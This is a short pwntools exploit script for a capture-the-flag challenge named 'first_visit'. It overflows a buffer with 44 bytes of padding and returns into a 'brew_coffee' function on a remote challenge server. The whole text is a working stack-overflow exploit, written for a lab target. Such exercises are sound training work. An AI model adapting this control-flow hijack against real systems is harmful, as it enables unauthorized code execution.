from pwn import *
elf = context.binary = ELF("./first_visit")
# p = process()
p = remote("chals1.apoorvctf.xyz", 3001)
rop = ROP(context.binary)
offset = 44
brew_coffee = elf.sym['brew_coffee']
rop.raw(b"A" * offset)
rop.raw(brew_coffee)
p.sendline(rop.chain())
print(p.recvall().strip())